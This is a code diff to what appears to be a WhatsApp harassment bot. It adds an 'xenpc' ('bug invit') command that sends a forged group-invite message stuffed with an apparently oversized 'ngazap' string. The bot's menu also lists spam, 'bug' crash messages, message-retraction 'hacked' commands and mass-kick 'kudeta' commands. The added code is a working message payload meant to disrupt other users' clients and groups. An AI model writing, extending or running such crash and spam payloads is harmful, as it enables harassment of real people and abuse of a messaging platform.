@@ -551,6 +551,23 @@ let buttons = [
        }
           break
 
+case 'xenpc':
+nomore2 = m.sender.replace(/[^0-9]/g, '')
+if (!nomore2) return reply('Masukin nomor target!')
+ var messa = prepareWAMessageMedia({ image: fs.readFileSync('./BotMedia/zarin.jpg') }, { upload: xinn.waUploadToServer })
+var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"groupInviteMessage": {
+"groupJid": "85296556573-1328272333@g.us",
+"inviteCode": "wFHwtOxGQN8OwK2x",
+"inviteExpiration": `🥵❄️POWETED BY XINN🔥🥶${ngazap}`,
+"groupName": `🥵❄️POWETED BY XINN🔥🥶${ngazap}`,
+"caption": `🥵❄️POWETED BY XINN🔥🥶${ngazap}`,
+"jpegThumbnail": messa.imageMessage,
+}
+}), { userJid: m.chat, quoted: m })
+xinn.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
+break
+
 case 'xendokv1':
  var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
 "documentMessage": {
@@ -956,7 +973,7 @@ var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.f
 "noteMessage": {
 "extendedTextMessage": {
 "requestFrom":`${pushname}`,
-"text": `*[ Bugmenu©️ ]*\n\n1. xenbugv (spam Xenpay)\n2. xenpay\n3. xenpaygc (masukin id grup)\n4. santedgc (masukin id grup)\n5. santed (masukin nomor dan pilih durasi)\n6. xentag (bug Jid)\n7. xendok (bug dokumen)\n8. xendokv1 (documen)\n9. stick (masukin jumlah) \n\n *[ MENU TAMBAHAN®️ ]*\n1. joinv1 (Masukin link Gc atau id)\n2. joinv2 (Masukin link Gc atau id)\n3. left (masukin id gc)\n4. hackedv1 (semua pesan yang di reply akan di tarik)\n5. hackedv2 (3 stick)\n6. hackedv3\n7. hack1 (despearing)\n8. hack2 (demoteall)\n9. promote\n10. z (hidetag)\n11. kudetav1 (kick all anti ban)\n12. kudetav2 (kick all rawan ban)\n13. tagall`,
+"text": `*[ Bugmenu©️ ]*\n\n1. xenbugv (spam Xenpay)\n2. xenpay\n3. xenpaygc (masukin id grup)\n4. santedgc (masukin id grup)\n5. santed (masukin nomor dan pilih durasi)\n6. xentag (bug Jid)\n7. xendok (bug dokumen)\n8. xendokv1 (documen)\n9. stick (masukin jumlah)\n10. xenpc (bug invit) \n\n *[ MENU TAMBAHAN®️ ]*\n1. joinv1 (Masukin link Gc atau id)\n2. joinv2 (Masukin link Gc atau id)\n3. left (masukin id gc)\n4. hackedv1 (semua pesan yang di reply akan di tarik)\n5. hackedv2 (3 stick)\n6. hackedv3\n7. hack1 (despearing)\n8. hack2 (demoteall)\n9. promote\n10. z (hidetag)\n11. kudetav1 (kick all anti ban)\n12. kudetav2 (kick all rawan ban)\n13. tagall`,
 }
 }}}), { userJid: m.chat, quoted: m })
 xinn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
